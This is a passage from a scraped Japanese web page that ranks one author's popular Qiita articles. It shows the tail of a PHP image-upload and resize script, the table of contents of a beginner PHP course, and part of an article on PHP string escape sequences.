                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s2">"[</span><span class="si">{</span><span class="nv">$k</span><span class="si">}</span><span class="s2">] 画像リソースの生成に失敗しました"</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="c1">// リサンプリング先画像リソースを生成する</span>
            <span class="nv">$dst</span> <span class="o">=</span> <span class="nb">imagecreatetruecolor</span><span class="p">(</span><span class="nv">$dst_w</span><span class="p">,</span> <span class="nv">$dst_h</span><span class="p">);</span>

            <span class="c1">// getimagesize関数で得られた情報も利用してリサンプリングを行う</span>
            <span class="nb">imagecopyresampled</span><span class="p">(</span><span class="nv">$dst</span><span class="p">,</span> <span class="nv">$src</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$dst_w</span><span class="p">,</span> <span class="nv">$dst_h</span><span class="p">,</span> <span class="nv">$info</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$info</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

            <span class="c1">// ファイルデータからSHA-1ハッシュを取ってファイル名を決定し、保存する</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$output</span><span class="p">(</span>
                <span class="nv">$dst</span><span class="p">,</span>
                <span class="nb">sprintf</span><span class="p">(</span><span class="s1">'./resized/%s%s'</span><span class="p">,</span>
                    <span class="nb">sha1_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">][</span><span class="nv">$k</span><span class="p">]),</span>
                    <span class="nb">image_type_to_extension</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
                <span class="p">)</span>
            <span class="p">))</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s2">"[</span><span class="si">{</span><span class="nv">$k</span><span class="si">}</span><span class="s2">] ファイル保存時にエラーが発生しました"</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="nv">$msgs</span><span class="p">[]</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'green'</span><span class="p">,</span> <span class="s2">"[</span><span class="si">{</span><span class="nv">$k</span><span class="si">}</span><span class="s2">] リサイズして保存しました"</span><span class="p">];</span>

        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">RuntimeException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>

            <span class="nv">$msgs</span><span class="p">[]</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'red'</span><span class="p">,</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">()];</span>

        <span class="p">}</span>

        <span class="c1">// リソースを解放</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">is_resource</span><span class="p">(</span><span class="nv">$img</span><span class="p">))</span> <span class="p">{</span>
            <span class="nb">imagedestroy</span><span class="p">(</span><span class="nv">$img</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$dst</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">is_resource</span><span class="p">(</span><span class="nv">$dst</span><span class="p">))</span> <span class="p">{</span>
            <span class="nb">imagedestroy</span><span class="p">(</span><span class="nv">$dst</span><span class="p">);</span>
        <span class="p">}</span>

    <span class="p">}</span>

<span class="p">}</span>

<span class="c1">// XHTMLとしてブラウザに認識させる</span>
<span class="c1">// (IE8以下はサポート対象外ｗ)</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>画像アップロード<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$msgs</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span>
  <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$msgs</span> <span class="k">as</span> <span class="nv">$msg</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
    <span class="p">&lt;</span><span class="nt">li</span> <span class="na">style</span><span class="o">=</span><span class="s">"color:</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$msg</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="cp">?&gt;</span><span class="s">;"</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span>
    <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$msg</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)</span>
    <span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span>
  <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
  <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"multipart/form-data"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span> <span class="na">action</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">fieldset</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">legend</span><span class="p">&gt;</span>画像ファイルを選択(GIF, JPEG, PNGのみ対応)<span class="p">&lt;/</span><span class="nt">legend</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"file"</span> <span class="na">name</span><span class="o">=</span><span class="s">"upfile[]"</span> <span class="p">/&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endfor</span><span class="p">;</span> <span class="cp">?&gt;</span>
      <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"送信"</span> <span class="p">/&gt;</span>
    <span class="p">&lt;/</span><span class="nt">fieldset</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />7位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>231</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/752e19a578cf7d96fc5f">【PHP入門講座】 目次</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-25 02:26:33</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[PHP入門講座]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="前書きとか" class="fragment"></span><a href="#%E5%89%8D%E6%9B%B8%E3%81%8D%E3%81%A8%E3%81%8B"><i class="fa fa-link"></i></a>前書きとか</h1>

<h2>
<span id="ターゲット層は" class="fragment"></span><a href="#%E3%82%BF%E3%83%BC%E3%82%B2%E3%83%83%E3%83%88%E5%B1%A4%E3%81%AF"><i class="fa fa-link"></i></a>ターゲット層は？</h2>

<p>最低限 <strong>HTML</strong> についてある程度理解をされている方が対象です。 <strong>XHTML</strong> や <strong>CSS</strong> についての理解もあった方が望ましいと思います。 <strong>C言語</strong> などの基本的なプログラミング言語の経験もあれば幾分か理解がラクになるでしょう。なお、本講座では <strong>XHTML5</strong> の書き方で統一することにします。以下に有用な参考サイトを紹介します。</p>

<p><strong>XHTML5 移行メモ</strong><br>
<a href="http://kanow.jp/web/xhtml5-memo.xhtml" class="autolink" rel="nofollow noopener" target="_blank">http://kanow.jp/web/xhtml5-memo.xhtml</a></p>

<p><strong>HTMLクイックリファレンス</strong><br>
<a href="http://www.htmq.com/" class="autolink" rel="nofollow noopener" target="_blank">http://www.htmq.com/</a></p>

<p><strong>W3G</strong><br>
<a href="https://w3g.jp/" class="autolink" rel="nofollow noopener" target="_blank">https://w3g.jp/</a></p>

<h2>
<span id="他に入門サイトとか既にあるんじゃないの" class="fragment"></span><a href="#%E4%BB%96%E3%81%AB%E5%85%A5%E9%96%80%E3%82%B5%E3%82%A4%E3%83%88%E3%81%A8%E3%81%8B%E6%97%A2%E3%81%AB%E3%81%82%E3%82%8B%E3%82%93%E3%81%98%E3%82%83%E3%81%AA%E3%81%84%E3%81%AE"><i class="fa fa-link"></i></a>他に入門サイトとか既にあるんじゃないの？</h2>

<p>入門向けといえども、<a href="http://ja.wikipedia.org/wiki/%E3%82%B9%E3%83%91%E3%82%B2%E3%83%86%E3%82%A3%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0" rel="nofollow noopener" target="_blank">スパゲティコード</a>を量産するようなものでは納得がいかないので、今回この講座の作成にあたることになりました。なお、私は普段から <strong>例外処理</strong> (想定外のリクエストが来たときの対応) をガチガチに固めるコーディングを心がけています。 「そこまでしなくてもいいだろ」と思う箇所もあるかもしれませんが、この講座では徹底していきたいと思います。エラーを全く出させないコーディングをしましょう。<ins>熟練者が分かっていて手抜きをするのと、初心者が手抜きと知らずに手抜きしてしまうのでは全く事情が異なります。</ins></p>

<h2>
<span id="何故にqiita上で" class="fragment"></span><a href="#%E4%BD%95%E6%95%85%E3%81%ABqiita%E4%B8%8A%E3%81%A7"><i class="fa fa-link"></i></a>何故にQiita上で？</h2>

<p>だって書くのめっちゃラクじゃんｗｗｗｗｗｗｗｗｗｗｗｗ</p>

<h1>
<span id="目次" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1"><i class="fa fa-link"></i></a>目次</h1>

<h2>
<span id="1-php概論" class="fragment"></span><a href="#1-php%E6%A6%82%E8%AB%96"><i class="fa fa-link"></i></a>1. PHP概論</h2>

<ol>
<li><a href="http://qiita.com/items/4508dc677b11e487effc">PHPを使うための準備</a></li>
<li><a href="http://qiita.com/mpyw/items/176fb1f6fb75da74339f" id="reference-c7b39d8e29d958eeaafc">PHPで出来ることと処理の流れ</a></li>
<li><a href="http://qiita.com/mpyw/items/95e205056e25b7a59dfa" id="reference-38823fb1959839d7d02c">変数と定数</a></li>
</ol>

<h2>
<span id="2-webフォームでの実践入門編" class="fragment"></span><a href="#2-web%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E3%81%A7%E3%81%AE%E5%AE%9F%E8%B7%B5%E5%85%A5%E9%96%80%E7%B7%A8"><i class="fa fa-link"></i></a>2. Webフォームでの実践(入門編)</h2>

<ol>
<li><a href="http://qiita.com/mpyw/items/565b3670dd0c7f9162fa" id="reference-e096f60ebe8111e64626">XSS攻撃への対策</a></li>
<li><a href="http://qiita.com/mpyw/items/55369c245b0d22755151" id="reference-0812781258088bb1c635">ユーザーに挨拶してみよう</a></li>
<li><a href="http://qiita.com/mpyw/items/f298828002bbc488fe89" id="reference-b3365962341613a5037e">想定外の入力への対応</a></li>
<li><a href="http://qiita.com/mpyw/items/85f930cd893ddb27ff12" id="reference-76cdbe51f2463e0e312e">ちょっとひといき</a></li>
</ol>

<h2>
<span id="3-型と演算子" class="fragment"></span><a href="#3-%E5%9E%8B%E3%81%A8%E6%BC%94%E7%AE%97%E5%AD%90"><i class="fa fa-link"></i></a>3. 型と演算子</h2>

<ol>
<li><a href="http://qiita.com/mpyw/items/96ed939a208e3cb95472" id="reference-484416f59841ef967208">デバッグ用関数</a></li>
<li><a href="http://qiita.com/mpyw/items/d61b50d90e84e289e2be" id="reference-626353d07f6a35d8baba">文字列</a></li>
<li><a href="http://qiita.com/mpyw/items/346c535ade9dcf6e1b12" id="reference-a0a93bf46f177f6c1516">数値・論理値・リソース</a></li>
<li><a href="http://qiita.com/mpyw/items/5a30250ba2d622352959" id="reference-a801daf840efd6640b00">配列</a></li>
<li><a href="http://qiita.com/mpyw/items/0a4ea0bc9a695da33f0c" id="reference-4dba0a4c79612d6bc296">NULLと未定義の違い</a></li>
<li><a href="http://qiita.com/mpyw/items/3aac811629622f7f4d8b" id="reference-02857f926b137cddfb1c">型変換</a></li>
<li><a href="http://qiita.com/mpyw/items/ce626976ec4dc07dfec2" id="reference-80a85fc8d0f2214969bd">ビット演算</a></li>
<li><a href="http://qiita.com/mpyw/items/1ea553fea092f597169a" id="reference-d621d8bb689158350b6d">演算子</a></li>
<li>緩やかな比較・厳密な比較</li>
</ol>

<h2>
<span id="4-制御構造と関数" class="fragment"></span><a href="#4-%E5%88%B6%E5%BE%A1%E6%A7%8B%E9%80%A0%E3%81%A8%E9%96%A2%E6%95%B0"><i class="fa fa-link"></i></a>4. 制御構造と関数</h2>

<ol>
<li>条件分岐とループ処理</li>
<li>関数とクロージャ</li>
<li>ジェネレータ</li>
<li>関数に似た言語構造</li>
<li>変数初期化の必要性</li>
<li>配列操作関数とその応用的な使い方</li>
<li>マジック定数</li>
</ol>

<h2>
<span id="5-参照" class="fragment"></span><a href="#5-%E5%8F%82%E7%85%A7"><i class="fa fa-link"></i></a>5. 参照</h2>

<ol>
<li>PHPにおけるプリミティブ型</li>
<li>シンボルテーブル</li>
<li>値渡しと参照渡し</li>
<li>参照カウント法とガベージコレクション</li>
</ol>

<h2>
<span id="6-スーパーグローバル変数" class="fragment"></span><a href="#6-%E3%82%B9%E3%83%BC%E3%83%91%E3%83%BC%E3%82%B0%E3%83%AD%E3%83%BC%E3%83%90%E3%83%AB%E5%A4%89%E6%95%B0"><i class="fa fa-link"></i></a>6. スーパーグローバル変数</h2>

<ol>
<li>GET・POST・COOKIE・REQUEST</li>
<li>FILES・SERVER・ENV</li>
<li>SESSION</li>
</ol>

<h2>
<span id="7-エラーと例外" class="fragment"></span><a href="#7-%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%A8%E4%BE%8B%E5%A4%96"><i class="fa fa-link"></i></a>7. エラーと例外</h2>

<ol>
<li>エラーの種類</li>
<li>例外処理の基本</li>
<li>エラーと例外の違い</li>
<li>例外スタックを用いた応用</li>
</ol>

<h2>
<span id="8-webフォームでの実践応用編" class="fragment"></span><a href="#8-web%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E3%81%A7%E3%81%AE%E5%AE%9F%E8%B7%B5%E5%BF%9C%E7%94%A8%E7%B7%A8"><i class="fa fa-link"></i></a>8. Webフォームでの実践(応用編)</h2>

<ol>
<li>ユーザー入力をフィルタリングする汎用関数の作成</li>
<li>カレンダー表示スクリプトの作成</li>
<li>メールフォームの作成(3ファイルに分割)</li>
<li>メールフォームの作成(1ファイルに梱包)</li>
</ol>

<h2>
<span id="9-クラスとオブジェクト前半" class="fragment"></span><a href="#9-%E3%82%AF%E3%83%A9%E3%82%B9%E3%81%A8%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E5%89%8D%E5%8D%8A"><i class="fa fa-link"></i></a>9. クラスとオブジェクト(前半)</h2>

<ol>
<li>クラス・オブジェクトとアクセス権</li>
<li>動的メソッドと動的プロパティ</li>
<li>静的メソッドと静的プロパティ・クラス定数</li>
<li>静的クラスとシングルトンの実現</li>
</ol>

<h2>
<span id="10-画像アップロード機能付きの掲示板作成" class="fragment"></span><a href="#10-%E7%94%BB%E5%83%8F%E3%82%A2%E3%83%83%E3%83%97%E3%83%AD%E3%83%BC%E3%83%89%E6%A9%9F%E8%83%BD%E4%BB%98%E3%81%8D%E3%81%AE%E6%8E%B2%E7%A4%BA%E6%9D%BF%E4%BD%9C%E6%88%90"><i class="fa fa-link"></i></a>10. 画像アップロード機能付きの掲示板作成</h2>

<ol>
<li>基本的な機能の実装</li>
<li>ファイルロック処理の実装</li>
<li>画像ファイルアップロード処理の実装</li>
<li>CSRF攻撃への対策</li>
</ol>

<h2>
<span id="11-クラスとオブジェクト後半" class="fragment"></span><a href="#11-%E3%82%AF%E3%83%A9%E3%82%B9%E3%81%A8%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E5%BE%8C%E5%8D%8A"><i class="fa fa-link"></i></a>11. クラスとオブジェクト(後半)</h2>

<ol>
<li>マジックメソッド</li>
<li>オブジェクトと参照渡し</li>
<li>クラスの継承と遅延静的束縛</li>
<li>抽象クラス・インターフェース・トレイト</li>
<li>名前空間</li>
</ol>

<h2>
<span id="12-正規表現" class="fragment"></span><a href="#12-%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE"><i class="fa fa-link"></i></a>12. 正規表現</h2>

<ol>
<li>正規表現を使うかどうかの検討</li>
<li>PCRE正規表現構文の基本</li>
<li>エスケープ処理</li>
<li>各PCRE正規表現関数とサブパターンの扱い</li>
<li>最短マッチと最長マッチ</li>
<li>独占的最長マッチと再試行無しサブパターン</li>
<li>後方参照と先読み・後読み</li>
<li>コメントと再帰パターン</li>
<li>条件付きサブパターン</li>
</ol>

<h2>
<span id="13-データベース" class="fragment"></span><a href="#13-%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>13. データベース</h2>

<ol>
<li>リレーショナルデータベースとは</li>
<li>phpMyAdminの基本的な使い方</li>
<li>PDOの基本</li>
<li>PDOの応用</li>
</ol>

<h2>
<span id="14-twitter風sns作成" class="fragment"></span><a href="#14-twitter%E9%A2%A8sns%E4%BD%9C%E6%88%90"><i class="fa fa-link"></i></a>14. Twitter風SNS作成</h2>

<ol>
<li>データベースと設定ファイルの作成</li>
<li>汎用関数モジュールの作成</li>
<li>汎用的な変数構造フィルタリング関数の作成</li>
<li>致命的なエラー発生時のためのページを準備</li>
<li>ユーザー・ログイン機能の実装</li>
<li>セッション固定攻撃への対策</li>
<li>ツイートの実装</li>
<li>ユーザーページの実装</li>
<li>フォロー機能の実装</li>
<li>タイムラインの実装</li>
<li>返信と非公式リツイートの実装</li>
<li>お気に入りの実装</li>
<li>公式リツイートの実装</li>
<li>ログアウトの実装</li>
<li>ツイートダウンロード機能の実装</li>
</ol>

<h1>
<span id="後書きとか" class="fragment"></span><a href="#%E5%BE%8C%E6%9B%B8%E3%81%8D%E3%81%A8%E3%81%8B"><i class="fa fa-link"></i></a>後書きとか</h1>

<h2>
<span id="お前これホントに全部つくんのｗｗｗ" class="fragment"></span><a href="#%E3%81%8A%E5%89%8D%E3%81%93%E3%82%8C%E3%83%9B%E3%83%B3%E3%83%88%E3%81%AB%E5%85%A8%E9%83%A8%E3%81%A4%E3%81%8F%E3%82%93%E3%81%AE%EF%BD%97%EF%BD%97%EF%BD%97"><i class="fa fa-link"></i></a>お前これホントに全部つくんの？？？ｗｗｗ</h2>

<p>さぁどうだろうねぇ（すっとぼけ）</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />8位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>207</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/8dd5378cb01c877e1f7b">私の正規表現におけるポリシー</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-08-08 22:23:50</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[正規表現]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="php言語レベルでのエスケープシーケンス" class="fragment"></span><a href="#php%E8%A8%80%E8%AA%9E%E3%83%AC%E3%83%99%E3%83%AB%E3%81%A7%E3%81%AE%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a><strong>PHP言語レベルでのエスケープシーケンス</strong>
</h1>

<p><strong><a href="http://php.net/manual/ja/language.types.string.php" rel="nofollow noopener" target="_blank">マニュアル</a></strong> も併せてお読みください。</p>

<h2>
<span id="シングルクオート内で処理されるシーケンス" class="fragment"></span><a href="#%E3%82%B7%E3%83%B3%E3%82%B0%E3%83%AB%E3%82%AF%E3%82%AA%E3%83%BC%E3%83%88%E5%86%85%E3%81%A7%E5%87%A6%E7%90%86%E3%81%95%E3%82%8C%E3%82%8B%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a>シングルクオート内で処理されるシーケンス</h2>

<table>
<thead>
<tr>
<th style="text-align: center">記述</th>
<th style="text-align: center">実際の表示</th>
<th style="text-align: center">意味</th>
<th style="text-align: center">備考</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center"><strong><code>\\</code></strong></td>
<td style="text-align: center">*<em>\*</em>
</td>
<td style="text-align: center">バックスラッシュ</td>
<td style="text-align: center">
<strong>【※1】</strong> 直後にシングルクオートがない場合は省略可能</td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\'</code></strong></td>
<td style="text-align: center"><strong>'</strong></td>
<td style="text-align: center">シングルクオート</td>
<td style="text-align: center"></td>
</tr>
</tbody>
</table>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">【※1】</span></div>
<div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s1">'[a]\[b]'</span><span class="p">;</span> <span class="c1"># =&gt; [a]\[b]</span>
<span class="k">echo</span> <span class="s1">'[a]\\[b]'</span><span class="p">;</span> <span class="c1"># =&gt; [a]\[b]</span>
<span class="k">echo</span> <span class="s1">'[a]\\\[b]'</span><span class="p">;</span> <span class="c1"># =&gt; [a]\\[b]</span>
<span class="k">echo</span> <span class="s1">'[a]\\\\[b]'</span><span class="p">;</span> <span class="c1"># =&gt; [a]\\[b]</span>
<span class="k">echo</span> <span class="s1">'\\'</span><span class="p">;</span> <span class="c1"># =&gt; \</span>
<span class="k">echo</span> <span class="err">'</span><span class="nx">\</span><span class="err">'</span><span class="p">;</span> <span class="c1"># パースエラー</span>
</pre></div>
</div>

<p>慣れないうちは省略せずに全てエスケープすることをおすすめします。ちなみにこれはPHPに限っての挙動であり、 <strong>C</strong> や <strong>Java</strong> ではこのような挙動にはならず、 <strong>必ずエスケープしなければなりません</strong> 。</p>

<h2>
<span id="ダブルクオート内で処理されるシーケンス" class="fragment"></span><a href="#%E3%83%80%E3%83%96%E3%83%AB%E3%82%AF%E3%82%AA%E3%83%BC%E3%83%88%E5%86%85%E3%81%A7%E5%87%A6%E7%90%86%E3%81%95%E3%82%8C%E3%82%8B%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a>ダブルクオート内で処理されるシーケンス</h2>

<p>一部マニュアルに記載がないものもあります。</p>

<table>
<thead>
<tr>
<th style="text-align: center">記述</th>
<th style="text-align: center">実際の表示</th>
<th style="text-align: center">意味</th>
<th style="text-align: center">備考</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center"><strong><code>\\</code></strong></td>
<td style="text-align: center">*<em>\*</em>
</td>
<td style="text-align: center">バックスラッシュ</td>
<td style="text-align: center">
<strong>【※1】</strong> 直後に他のエスケープ可能な文字がない場合は省略可能</td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\"</code></strong></td>
<td style="text-align: center">"</td>
<td style="text-align: center">ダブルクオート</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\$</code></strong></td>
<td style="text-align: center">$</td>
<td style="text-align: center">ドル記号</td>
<td style="text-align: center">
<strong>【※2】</strong> 直後に変数名に使える文字がなければ省略可能</td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\0</code></strong></td>
<td style="text-align: center"></td>
<td style="text-align: center">NULL文字</td>
<td style="text-align: center">（実際は下で紹介している8進数表記のものに属する）</td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\n</code></strong></td>
<td style="text-align: center"></td>
<td style="text-align: center">ラインフィード</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\r</code></strong></td>
<td style="text-align: center"></td>
<td style="text-align: center">キャリッジリターン</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\t</code></strong></td>
<td style="text-align: center"></td>
<td style="text-align: center">水平タブ</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\v</code></strong></td>
<td style="text-align: center"></td>
<td style="text-align: center">垂直タブ</td>
<td style="text-align: center">PHP5.2.5以降のみ</td>
</tr>
<tr>
<td style="text-align: center"><strong><code>\e</code></strong></td>
<td style="text-align: center"></td>
<td style="text-align: center">エスケープ</td>
<td style="text-align: center">PHP5.4.0以降のみ</td>
</tr>
<tr>
<td style="text-align: center"><code>\123</code></td>
<td style="text-align: center">S</td>
<td style="text-align: center">8進数表記でのアスキーコード指定</td>
<td style="text-align: center">正規表現は <strong><code>\[0-7]{1,3}</code></strong>
</td>
</tr>
<tr>
<td style="text-align: center"><code>\x53</code></td>
<td style="text-align: center">S</td>
<td style="text-align: center">16進数表記でのアスキーコード指定</td>
<td style="text-align: center">正規表現は <strong><code>\x[0-9A-Fa-f]{1,2}</code></strong>
</td>
</tr>
<tr>
<td style="text-align: center"><code>{$var}</code></td>
<td style="text-align: center">$var の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><code>$var</code></td>
<td style="text-align: center">$var の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><code>{$var[0]}</code></td>
<td style="text-align: center">$var[0] の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><code>$var[0]</code></td>
<td style="text-align: center">$var[0] の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><code>{$var['hoge']}</code></td>
<td style="text-align: center">$var['hoge'] の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center">↓ との違いに注意</td>
</tr>
<tr>
<td style="text-align: center"><code>$var[hoge]</code></td>
<td style="text-align: center">$var['hoge'] の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center">↑ との違いに注意</td>
</tr>
</tbody>
</table>

<p><strong>【※2】</strong><br>
ここでの「変数名に使える文字」とは、 <code>${"hoge\r\nhoge"}</code> などせずとも、直接PHPコードとして書けるものを指します。正規表現 <strong><code>[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*</code></strong> にマッチする文字列です。</p>

<h2>
<span id="ヒアドキュメント内で処理されるシーケンス" class="fragment"></span><a href="#%E3%83%92%E3%82%A2%E3%83%89%E3%82%AD%E3%83%A5%E3%83%A1%E3%83%B3%E3%83%88%E5%86%85%E3%81%A7%E5%87%A6%E7%90%86%E3%81%95%E3%82%8C%E3%82%8B%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a>ヒアドキュメント内で処理されるシーケンス</h2>

